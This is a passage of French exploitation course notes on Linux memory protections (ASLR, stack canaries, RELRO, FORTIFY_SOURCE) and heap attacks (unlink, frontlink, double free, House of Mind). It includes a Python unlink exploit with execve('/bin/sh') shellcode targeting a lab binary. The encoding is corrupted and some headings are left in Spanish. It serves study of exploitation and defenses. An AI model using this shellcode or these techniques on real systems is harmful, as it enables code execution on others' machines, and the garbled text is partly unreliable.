Les variables d'environnement et les arguments se d√©placent moins qu'un tampon dans la pile.

**Retour dans printf**

C'est une technique pour convertir un d√©bordement de tampon en une erreur de cha√Æne de format. Elle consiste √† remplacer l'EIP pour qu'il pointe vers un printf de la fonction et √† lui passer comme argument une cha√Æne de format manipul√©e pour obtenir des valeurs sur l'√©tat du processus.

**Attaque sur les biblioth√®ques**

Les biblioth√®ques sont √† une position avec 16 bits d'al√©atoire = 65636 adresses possibles. Si un serveur vuln√©rable appelle fork(), l'espace d'adresse m√©moire est clon√© dans le processus enfant et reste intact. Il est donc possible de tenter un brute force sur la fonction usleep() de libc en lui passant "16" comme argument de sorte que lorsqu'elle met plus de temps que d'habitude √† r√©pondre, cette fonction aura √©t√© trouv√©e. Sachant o√π se trouve cette fonction, on peut obtenir delta\_mmap et calculer les autres.

La seule fa√ßon d'√™tre s√ªr que l'ASLR fonctionne est d'utiliser une architecture 64 bits. Il n'y a pas d'attaques par force brute l√†-bas.

**StackGuard et StackShield**

**StackGuard** ins√®re avant l'EIP ‚Äî> 0x000aff0d(null, \n, EndOfFile(EOF), \r) ‚Äî> Toujours vuln√©rable √† recv(), memcpy(), read(), bcopy() et ne prot√®ge pas l'EBP

**StackShield** est plus √©labor√© que StackGuard

Il stocke dans une table (Global Return Stack) toutes les adresses EIP de retour de sorte que le d√©bordement ne cause aucun dommage. De plus, les deux adresses peuvent √™tre compar√©es pour voir s'il y a eu un d√©bordement.

On peut √©galement v√©rifier l'adresse de retour avec une valeur limite, donc si l'EIP va √† un endroit diff√©rent de l'habitude comme l'espace de donn√©es, on le saura. Mais cela peut √™tre contourn√© avec Ret-to-lib, ROPs ou ret2ret.

Comme on peut le voir, stackshield ne prot√®ge pas non plus les variables locales.

**Stack Smash Protector (ProPolice) -fstack-protector**

Le canari est plac√© avant l'EBP. Il r√©organise les variables locales pour que les tampons soient dans les positions les plus hautes et ainsi ne puissent pas √©craser d'autres variables.

De plus, il effectue une copie s√©curis√©e des arguments pass√©s au-dessus de la pile (au-dessus des variables locales) et utilise ces copies comme arguments.

Il ne peut pas prot√©ger les tableaux de moins de 8 √©l√©ments ni les tampons qui font partie d'une structure utilisateur.

Le canari est un nombre al√©atoire tir√© de "/dev/urandom" ou sinon est 0xff0a0000. Il est stock√© dans TLS (Thread Local Storage). Les threads partagent le m√™me espace m√©moire, le TLS est une zone qui a des variables globales ou statiques de chaque thread. Cependant, en principe, celles-ci sont copi√©es du processus parent bien que le processus enfant puisse modifier ces donn√©es sans modifier celles du parent ni celles des autres enfants. Le probl√®me est que si on utilise fork() mais qu'on ne cr√©e pas un nouveau canari, alors tous les processus (parent et enfants) utilisent le m√™me canari. Sur i386, il est stock√© dans gs:0x14 et sur x86\_64, il est stock√© dans fs:0x28

Cette protection localise les fonctions qui ont des tampons qui peuvent √™tre attaqu√©s et inclut dans ces fonctions du code au d√©but pour placer le canari et du code √† la fin pour le v√©rifier.

La fonction fork() r√©alise une copie exacte du processus parent, c'est pourquoi si un serveur web appelle fork(), on peut r√©aliser une attaque par force brute byte par byte jusqu'√† d√©couvrir le canari utilis√©.

Si on utilise la fonction execve() apr√®s fork(), l'espace est r√©√©crit et l'attaque n'est plus possible. vfork() permet d'ex√©cuter le processus enfant sans cr√©er de duplicata jusqu'√† ce que le processus enfant tente d'√©crire, alors il cr√©ait le duplicata.

**Relocation Read-Only (RELRO)**

### Relro

**Relro (Relocalisation en lecture seule)** affecte les permissions de m√©moire de mani√®re similaire √† NX. La diff√©rence est que NX rend la pile ex√©cutable, RELRO rend **certaines choses en lecture seule** donc nous **ne pouvons pas √©crire** dessus. La fa√ßon la plus courante que j'ai vue cela √™tre un obstacle est d'emp√™cher de faire une **sur√©criture de la table `got`**, qui sera abord√©e plus tard. La table `got` contient les adresses des fonctions libc afin que le binaire sache quelles sont les adresses et puisse les appeler. Voyons √† quoi ressemblent les permissions de m√©moire pour une entr√©e de la table `got` pour un binaire avec et sans relro.

Avec relro :
```bash
gef‚û§  vmmap
Start              End                Offset             Perm Path
0x0000555555554000 0x0000555555555000 0x0000000000000000 r-- /tmp/tryc
0x0000555555555000 0x0000555555556000 0x0000000000001000 r-x /tmp/tryc
0x0000555555556000 0x0000555555557000 0x0000000000002000 r-- /tmp/tryc
0x0000555555557000 0x0000555555558000 0x0000000000002000 r-- /tmp/tryc
0x0000555555558000 0x0000555555559000 0x0000000000003000 rw- /tmp/tryc
0x0000555555559000 0x000055555557a000 0x0000000000000000 rw- [heap]
0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gef‚û§  p fgets
$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
gef‚û§  search-pattern 0x7ffff7e4d100
[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
[+] In '/tmp/tryc'(0x555555557000-0x555555558000), permission=r--
0x555555557fd0 - 0x555555557fe8  ‚Üí   "\x00\xd1\xe4\xf7\xff\x7f[...]"
```
Sans relro :
```bash
gef‚û§  vmmap
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-- /tmp/try
0x0000000000401000 0x0000000000402000 0x0000000000001000 r-x /tmp/try
0x0000000000402000 0x0000000000403000 0x0000000000002000 r-- /tmp/try
0x0000000000403000 0x0000000000404000 0x0000000000002000 r-- /tmp/try
0x0000000000404000 0x0000000000405000 0x0000000000003000 rw- /tmp/try
0x0000000000405000 0x0000000000426000 0x0000000000000000 rw- [heap]
0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gef‚û§  p fgets
$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
gef‚û§  search-pattern 0x7ffff7e4d100
[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
[+] In '/tmp/try'(0x404000-0x405000), permission=rw-
0x404018 - 0x404030  ‚Üí   "\x00\xd1\xe4\xf7\xff\x7f[...]"
```
Pour le binaire **sans relro**, nous pouvons voir que l'adresse de l'entr√©e `got` pour `fgets` est `0x404018`. En regardant les mappages de m√©moire, nous voyons qu'elle se situe entre `0x404000` et `0x405000`, qui a les **permissions `rw`**, ce qui signifie que nous pouvons lire et √©crire dessus. Pour le binaire **avec relro**, nous voyons que l'adresse de la table `got` pour l'ex√©cution du binaire (pie est activ√© donc cette adresse changera) est `0x555555557fd0`. Dans le mappage de m√©moire de ce binaire, elle se situe entre `0x0000555555557000` et `0x0000555555558000`, qui a la **permission de m√©moire `r`**, ce qui signifie que nous pouvons seulement lire.

Alors, quelle est la **contournement**? Le contournement typique que j'utilise est de simplement ne pas √©crire dans les r√©gions de m√©moire que relro rend en lecture seule, et **trouver une autre mani√®re d'obtenir l'ex√©cution de code**.

Notez que pour que cela se produise, le binaire doit conna√Ætre avant l'ex√©cution les adresses des fonctions :

* Liaison paresseuse : L'adresse d'une fonction est recherch√©e la premi√®re fois que la fonction est appel√©e. Ainsi, le GOT doit avoir des permissions d'√©criture pendant l'ex√©cution.
* Lier maintenant : Les adresses des fonctions sont r√©solues au d√©but de l'ex√©cution, puis des permissions en lecture seule sont donn√©es aux sections sensibles comme .got, .dtors, .ctors, .dynamic, .jcr. `` `**``-z relro`**`et`**`-z now\`\*\*

Pour v√©rifier si un programme utilise Lier maintenant, vous pouvez faire :
```bash
readelf -l /proc/ID_PROC/exe | grep BIND_NOW
```
```markdown
Lorsque le binaire est charg√© en m√©moire et qu'une fonction est appel√©e pour la premi√®re fois, on saute √† la PLT (Procedure Linkage Table), d'o√π un saut (jmp) est effectu√© vers la GOT et d√©couvre que cette entr√©e n'a pas √©t√© r√©solue (elle contient une adresse suivante de la PLT). Par cons√©quent, il invoque le Runtime Linker ou rtfd pour r√©soudre l'adresse et la sauvegarder dans la GOT.

Lorsqu'une fonction est appel√©e, on appelle la PLT, qui a l'adresse de la GOT o√π l'adresse de la fonction est stock√©e, redirigeant ainsi le flux l√†-bas et appelant la fonction. Cependant, si c'est la premi√®re fois que la fonction est appel√©e, ce qui se trouve dans la GOT est l'instruction suivante de la PLT, donc le flux suit le code de la PLT (rtfd) et d√©couvre l'adresse de la fonction, la sauvegarde dans la GOT et l'appelle.

Lors du chargement d'un binaire en m√©moire, le compilateur a indiqu√© √† quel d√©calage les donn√©es qui doivent √™tre charg√©es lors de l'ex√©cution du programme doivent √™tre plac√©es.

Lazy binding ‚Äî> L'adresse de la fonction est recherch√©e la premi√®re fois que cette fonction est invoqu√©e, donc la GOT a des permissions d'√©criture pour que, lorsqu'elle est recherch√©e, elle soit sauvegard√©e l√† et qu'il ne soit pas n√©cessaire de la rechercher √† nouveau.

Bind now ‚Äî> Les adresses des fonctions sont recherch√©es lors du chargement du programme et les permissions des sections .got, .dtors, .ctors, .dynamic, .jcr sont chang√©es en lecture seule. **-z relro** et **-z now**

Malgr√© cela, en g√©n√©ral, les programmes ne sont pas compil√©s avec ces options, donc ces attaques restent possibles.

**readelf -l /proc/ID_PROC/exe | grep BIND_NOW** ‚Äî> Pour savoir s'ils utilisent le BIND NOW

**Fortify Source -D_FORTIFY_SOURCE=1 ou =2**

Essaie d'identifier les fonctions qui copient d'un endroit √† un autre de mani√®re non s√©curis√©e et de changer la fonction par une fonction s√©curis√©e.

Par exemple :\
char buf[16];\
strcpy(but, source);

Il l'identifie comme non s√©curis√© et change alors strcpy() par __strcpy_chk() en utilisant la taille du tampon comme taille maximale √† copier.

La diff√©rence entre **=1** ou **=2** est que :

La seconde ne permet pas que **%n** provienne d'une section avec des permissions d'√©criture. De plus, le param√®tre pour l'acc√®s direct aux arguments ne peut √™tre utilis√© que si les pr√©c√©dents sont utilis√©s, c'est-√†-dire, on ne peut utiliser **%3$d** que si **%2$d** et **%1$d** ont √©t√© utilis√©s auparavant.

Pour afficher le message d'erreur, on utilise argv[0], donc si on met dans argv[0] l'adresse d'un autre endroit (comme une variable globale), le message d'erreur montrera le contenu de cette variable. Page 191

**Remplacement de Libsafe**

Il est activ√© avec : LD_PRELOAD=/lib/libsafe.so.2\
ou\
"/lib/libsave.so.2" > /etc/ld.so.preload

Il intercepte les appels √† certaines fonctions non s√©curis√©es par d'autres s√©curis√©es. Ce n'est pas standardis√©. (seulement pour x86, pas pour les compilations avec -fomit-frame-pointer, pas de compilations statiques, toutes les fonctions vuln√©rables ne deviennent pas s√©curis√©es et LD_PRELOAD ne fonctionne pas dans les binaires avec suid).

**ASCII Armored Address Space**

Consiste √† charger les biblioth√®ques partag√©es de 0x00000000 √† 0x00ffffff pour qu'il y ait toujours un octet 0x00. Cependant, cela n'arr√™te vraiment presque aucune attaque, et encore moins en little endian.

**ret2plt**

Consiste √† effectuer un ROP de mani√®re √† appeler la fonction strcpy@plt (de la plt) et √† pointer vers l'entr√©e de la GOT et √† copier le premier octet de la fonction que l'on veut appeler (system()). Ensuite, on fait de m√™me en pointant vers GOT+1 et on copie le 2√®me octet de system()... √Ä la fin, on appelle l'adresse sauvegard√©e dans GOT qui sera system()

**Faux EBP**

Pour les fonctions qui utilisent l'EBP comme registre pour pointer vers les arguments, en modifiant l'EIP et en pointant vers system(), l'EBP doit √©galement √™tre modifi√© pour qu'il pointe vers une zone de m√©moire qui ait 2 octets quelconques et ensuite l'adresse √† &"/bin/sh".

**Jaulas con chroot()**

debootstrap -arch=i386 hardy /home/user ‚Äî> Installe un syst√®me de base sous un sous-r√©pertoire sp√©cifique

Un admin peut sortir de l'une de ces cages en faisant : mkdir foo; chroot foo; cd ..

**Instrumentation de code**

Valgrind ‚Äî> Recherche d'erreurs\
Memcheck\
RAD (Return Address Defender)\
Insure++

## **8 D√©bordements de tas : Exploits basiques**

**Trozo asignado**

prev_size |\
size | ‚ÄîEn-t√™te\
*mem | Donn√©es

**Trozo libre**

prev_size |\
size |\
*fd | Pointeur vers le chunk suivant\
*bk | Pointeur vers le chunk pr√©c√©dent ‚ÄîEn-t√™te\
*mem | Donn√©es

Les chunks libres sont dans une liste doublement cha√Æn√©e (bin) et il ne peut jamais y avoir deux chunks libres c√¥te √† c√¥te (ils fusionnent)

Dans "size", il y a des bits pour indiquer : Si le chunk pr√©c√©dent est utilis√©, si le chunk a √©t√© allou√© via mmap() et si le chunk appartient √† l'ar√®ne principale.

Si lors de la lib√©ration d'un chunk, l'un des chunks contigus est libre, ils fusionnent en utilisant la macro unlink() et le nouveau chunk plus grand est pass√© √† frontlink() pour l'ins√©rer dans le bin appropri√©.

unlink(){\
BK = P->bk; ‚Äî> Le BK du nouveau chunk est celui qu'avait le chunk libre pr√©c√©dent\
FD = P->fd; ‚Äî> Le FD du nouveau chunk est celui qu'avait le chunk libre pr√©c√©dent\
FD->bk = BK; ‚Äî> Le BK du chunk suivant pointe vers le nouveau chunk\
BK->fd = FD; ‚Äî> Le FD du chunk pr√©c√©dent pointe vers le nouveau chunk\
}

Donc, si nous parvenons √† modifier le P->bk avec l'adresse d'un shellcode et le P->fd avec l'adresse d'une entr√©e dans la GOT ou DTORS moins 12, on obtient :

BK = P->bk = &shellcode\
FD = P->fd = &__dtor_end__ - 12\
FD->bk = BK -> *((&__dtor_end__ - 12) + 12) = &shellcode

Et ainsi le shellcode est ex√©cut√© √† la sortie du programme.

De plus, la 4√®me instruction de unlink() √©crit quelque chose et le shellcode doit √™tre pr√©par√© pour cela :

BK->fd = FD -> *(&shellcode + 8) = (&__dtor_end__ - 12) ‚Äî> Cela provoque l'√©criture de 4 octets √† partir du 8√®me octet du shellcode, donc la premi√®re instruction du shellcode doit √™tre un jmp pour sauter cela et tomber sur des nops qui m√®nent au reste du shellcode.

Donc, l'exploit est cr√©√© :

Dans le buffer1, nous mettons le shellcode commen√ßant par un jmp pour qu'il tombe sur les nops ou sur le reste du shellcode.

Apr√®s le shellcode, nous mettons du remplissage jusqu'√† atteindre les champs prev_size et size du chunk suivant. √Ä ces endroits, nous mettons 0xfffffff0 (de sorte que le prev_size soit √©cras√© pour avoir le bit indiquant qu'il est libre) et "-4" (0xfffffffc) dans le size (pour que lorsqu'il v√©rifie dans le 3√®me chunk si le 2√®me √©tait libre, il aille en r√©alit√© au prev_size modifi√© qui lui dira qu'il est libre) -> Ainsi, lorsque free() enqu√™tera, il ira au size du 3√®me mais en r√©alit√© au 2√®me - 4 et pensera que le 2√®me chunk est libre. Et alors il appellera **unlink()**.

En appelant unlink(), il utilisera comme P->fd les premi√®res donn√©es du 2√®me chunk, donc l√†, nous mettrons l'adresse que nous voulons √©craser - 12 (car dans FD->bk, il ajoutera 12 √† l'adresse sauvegard√©e dans FD). Et dans cette adresse, il introduira la deuxi√®me adresse trouv√©e dans le 2√®me chunk, qui nous int√©ressera pour qu'elle soit l'adresse du shellcode (P->bk faux).

**from struct import \***

**import os**

**shellcode = "\xeb\x0caaaabbbbcccc" #jm 12 + 12bytes de remplissage**

**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev_size = pack("\<I‚Äù, 0xfffffff0) #Int√©ressant que le bit indiquant que le chunk pr√©c√©dent est libre soit √† 1**

**fake_size = pack("\<I‚Äù, 0xfffffffc) #-4, pour que le "size" du 3√®me chunk soit 4 octets derri√®re (il pointe vers prev_size) car c'est l√† qu'il regarde si le 2√®me chunk est libre**

**addr_sc = pack("\<I", 0x0804a008 + 8) #Dans le payload au d√©but, nous mettrons 8 octets de remplissage**

**got_free = pack("\<I", 0x08048300 - 12) #Adresse de free() dans la plt-12 (ce sera l'adresse qui sera √©cras√©e pour que le shellcode soit lanc√© la 2√®me fois que free() est appel√©)**

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) #Comme dit pr√©c√©demment, le payload commence avec 8 octets de remplissage**

**payload += prev_size + fake_size + got_free + addr_sc #Le 2√®me chunk est modifi√©, le got_free pointe vers o√π nous allons sauvegarder l'adresse addr_sc + 12**

**os.system("./8.3.o " + payload)**

**unset() lib√©rant dans le sens inverse (wargame)**

Nous contr√¥lons 3 chunks cons√©cutifs et ils sont lib√©r√©s dans l'ordre inverse de la r√©servation.

Dans ce cas :

Dans le chunk c, on met le shellcode

Le chunk a est utilis√© pour √©craser le b de sorte que le size ait le bit PREV_INUSE d√©sactiv√© de sorte qu'il pense que le chunk a est libre.

De plus, le size est √©cras√© dans l'en-t√™te b pour qu'il vaille -4.

Ainsi, le programme pensera que "a" est libre et dans un bin, donc il appellera unlink() pour le d√©senlacer. Cependant, comme la taille PREV_SIZE vaut -4. Il pensera que le morceau de "a" commence r√©ellement √† b+4. C'est-√†-dire, il fera un unlink() √† un morceau qui commence √† b+4, donc √† b+12 sera le pointeur "fd" et √† b+16 sera le pointeur "bk".

De cette fa√ßon, si nous mettons l'adresse du shellcode dans bk et l'adresse de la fonction "puts()" -12 dans fd, nous avons notre payload.

**Technique de Frontlink**

Frontlink est appel√© lorsqu'un √©l√©ment est lib√©r√© et aucun de ses chunks contigus n'est libre, unlink() n'est pas appel√© mais frontlink() est appel√© directement.

Vuln√©rabilit√© utile lorsque le malloc attaqu√© n'est jamais lib√©r√© (free()).

N√©cessite :

Un tampon qui peut √™tre d√©bord√© avec la fonction d'entr√©e de donn√©es

Un tampon contigu √† celui-ci qui doit √™tre lib√©r√© et dont le champ fd de l'en-t√™te sera modifi√© gr√¢ce au d√©bordement du tampon pr√©c√©dent

Un tampon √† lib√©rer avec une taille sup√©rieure √† 512 mais inf√©rieure au tampon pr√©c√©dent

Un tampon d√©clar√© avant l'√©tape 3 qui permet de r√©√©crire le prev_size de celui-ci

De cette fa√ßon, en r√©ussissant √† √©crire de mani√®re incontr√¥l√©e dans deux mallocs et de mani√®re contr√¥l√©e mais en lib√©rant seulement celui-ci, nous pouvons cr√©er un exploit.

**Vuln√©rabilit√© double free()**

Si free() est appel√© deux fois avec le m√™me pointeur, deux bins pointent vers la m√™me adresse.

Si l'on veut r√©utiliser l'un, il sera attribu√© sans probl√®me. Si l'on veut utiliser un autre, il lui sera attribu√© le m√™me espace, donc nous aurons les pointeurs "fd" et "bk" falsifi√©s avec les donn√©es que la r√©servation pr√©c√©dente √©crira.

**After free()**

Un pointeur pr√©c√©demment lib√©r√© est r√©utilis√© sans contr√¥le.

## **8 D√©bordements de tas : Exploits avanc√©s**

Les techniques Unlink() et FrontLink() ont √©t√© √©limin√©es en modifiant la fonction unlink().

**The house of mind**

Une seule appel √† free() est n√©cessaire pour provoquer l'ex√©cution de code arbitraire. Il est int√©ressant de chercher un deuxi√®me chunk qui peut √™tre d√©bord√© par un pr√©c√©dent et lib√©r√©.

Un appel √† free() provoque l'appel √† public_fREe(mem), qui fait :

mstate ar_ptr;

mchunkptr p;

‚Ä¶

p = mem2chunk(mes); ‚Äî> Renvoie un pointeur √† l'adresse o√π commence le chunk (mem-8)

‚Ä¶

ar_ptr = arena_for_chunk(p); ‚Äî> chunk_non_main_arena(ptr)?heap_for_ptr(ptr)->ar_ptr:&main_arena [1]

‚Ä¶

_int_free(ar_ptr, mem);

}

Dans [1], il v√©rifie le champ size le bit NON_MAIN_ARENA, qui peut √™tre modifi√© pour que la v√©rification retourne true et ex√©cute heap_for_ptr() qui fait un and √† "mem" en mettant √† 0 les 2,5 octets les moins importants (dans notre cas de 0x0804a000 laisse 0x08000000) et acc√®de √† 0x08000000->ar_ptr (comme si c'√©tait un struct heap_info)

De cette fa√ßon, si nous pouvons contr√¥ler un chunk par exemple √† 0x0804a000 et qu'un chunk va √™tre lib√©r√© √† **0x081002a0**, nous pouvons atteindre l'adresse 0x08100000 et √©crire ce que nous voulons, par exemple **0x0804a000**. Lorsque ce deuxi√®me chunk sera lib√©r√©, il trouvera que heap_for_ptr(ptr)->ar_ptr retourne ce que nous avons √©crit √† 0x08100000 (car l'and que nous avons vu pr√©c√©demment est appliqu√© √† 0x081002a0 et de l√†, il prend la valeur des 4 premiers octets, le ar_ptr)

De cette fa√ßon, _int_free(ar_ptr, mem) est appel√©, c'est-√†-dire, **_int_free(0x0804a000, 0x081002a0)**
**_int_free(mstate av, Void_t* mem){**\
‚Ä¶\
bck = unsorted_chunks(av);\
fwd = bck->fd;\
p->bk = bck;\
p->fd = fwd;\
bck->fd = p;\
fwd->bk = p;

..}

Comme nous l'avons vu pr√©c√©demment, nous pouvons contr√¥ler la valeur de av, car c'est ce que nous √©crivons dans le chunk qui va √™tre lib√©r√©.

Comme unsorted_chunks est d√©fini, nous savons que :\
bck = &av->bins[2]-8;\
fwd = bck->fd = *(av->bins[2]);\
fwd->bk = *(av->bins[2] + 12) = p;

Par cons√©quent, si dans av->bins[2] nous √©crivons la valeur de __DTOR_END__-12, dans la derni√®re instruction, l'adresse du deuxi√®me chunk sera √©crite dans __DTOR_END__.

C'est-√†-dire, dans le premier chunk, nous devons mettre au d√©but plusieurs fois l'adresse de __DTOR_END__-12 parce que c'est de l√† que av->bins[2] sera extrait.

√Ä l'adresse o√π tombe l'adresse du deuxi√®me chunk avec les 5 derniers z√©ros, nous devons √©crire l'adresse de ce premier chunk pour que heap_for_ptr() pense que l'ar_ptr est au d√©but du premier chunk et en tire av->bins[2]

Dans le deuxi√®me chunk et gr√¢ce au premier, nous √©crasons le prev_size avec un saut 0x0c et le size avec quelque chose pour activer -> NON_MAIN_ARENA

Ensuite, dans le chunk 2, nous mettons beaucoup de nops et finalement le shellcode

De cette fa√ßon, _int_free(TROZO1, TROZO2) sera appel√© et suivra les instructions pour √©crire
